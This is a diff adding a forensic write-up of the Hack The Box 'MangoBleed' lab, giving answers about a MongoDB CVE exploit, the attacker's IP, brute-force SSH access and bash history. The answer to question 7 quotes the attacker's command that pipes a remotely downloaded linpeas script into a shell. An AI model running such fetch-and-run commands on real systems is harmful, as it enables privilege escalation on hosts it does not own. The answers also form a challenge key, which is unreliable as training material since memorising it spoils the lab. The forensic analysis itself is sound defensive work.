@@ -4117,6 +4117,63 @@ The first 1500 bytes is the Header and junk data. C2 server need to skip these b
 
 **FLAG:** `HTB{h0w_c4N_y0U_s3e_p05H_c0mM4nd?}`
 
+### XI. MangoBleed:
+> - Link lab: https://app.hackthebox.com/sherlocks/MangoBleed?tab=play_sherlock
+> - Đề bài:
+> ![image](https://hackmd.io/_uploads/HJQ48nHdGg.png)
+
+#### 1. What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?
+Search on Google:
+![image](https://hackmd.io/_uploads/Sk37nGv_Ge.png)
+
+**Answer:** `CVE-2025-14847`
+
+#### 2. What is the version of MongoDB installed on the server that the CVE exploited?
+Using FTK Imager to analyse the given folder, accessing to `/var/log/mongodb/mongod.log`:
+![image](https://hackmd.io/_uploads/Sy8PTGvdMl.png)
+> Besides that, in `var/log/apt/history.log`:
+> ![image](https://hackmd.io/_uploads/Bk0I78uuMg.png)
+
+**Answer:** `8.0.16`
+
+#### 3. Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.
+There has a lot connections from `65.0.76.43:35350`:
+![image](https://hackmd.io/_uploads/SkVKCfvdfx.png)
+
+**Answer:** `65.0.76.43`
+
+#### 4. Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)
+According to the above question:
+![image](https://hackmd.io/_uploads/Hk5ARMDdGl.png)
+
+**Answer:** `2025-12-29 05:25:52`
+
+#### 5. Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.
+There are `37630` connections intiated by the attacker, and `37630` disconnections. The total number of malicious connections is `75260`:
+![image](https://hackmd.io/_uploads/rJ8A6HdOMg.png)
+
+**Answer:** `75260`
+
+#### 6. The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?
+In `/var/log/auth.log`:
+![image](https://hackmd.io/_uploads/HkqigUOOze.png)
+There has a lot of atempts to brute-force to the system from `65.0.76.43`. At `2025-12-29 05:40:03`:
+![image](https://hackmd.io/_uploads/BJoUWLd_Gl.png)
+The access from attacker was accepted and a new session was opened.
+**Answer:** `2025-12-29 05:40:03`
+
+#### 7. Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
+In `[root]/home/mongoadmin/.bash_history`:
+![image](https://hackmd.io/_uploads/BJqe8Uuufx.png)
+
+**Answer:** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
+
+#### 8. TThe attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?
+In the `.bash_history` at the above question:
+![image](https://hackmd.io/_uploads/SkIsLI_dzl.png)
+
+**Answer:** `/var/lib/mongodb`
+
 ## DFIR-LAB:
 > Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS
 
